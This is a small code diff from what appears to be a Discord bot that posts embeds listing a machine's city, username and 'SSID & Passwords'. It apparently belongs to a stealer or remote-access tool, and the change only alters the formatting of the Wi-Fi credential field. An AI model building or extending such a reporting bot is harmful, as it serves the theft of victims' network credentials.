@@ -101,7 +101,7 @@ async def on_ready():
         embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
         embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
-        embed.add_field(name="**SSID & Passwords:**",value=f"```{SSIDlink}```",inline=True)
+        embed.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
 
         embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
@@ -123,7 +123,7 @@ async def on_ready():
         embed.add_field(name="**City:**",value=f"```{city}```",inline=True)
         embed.add_field(name="**Username:**",value=f"```{username}```",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
-        embed.add_field(name="**SSID & Passwords:**",value=f"```{SSIDlink}```",inline=True)
+        embed.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
         embed.add_field(name="ㅤ", value="ㅤ",inline=True)
 
         embed.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
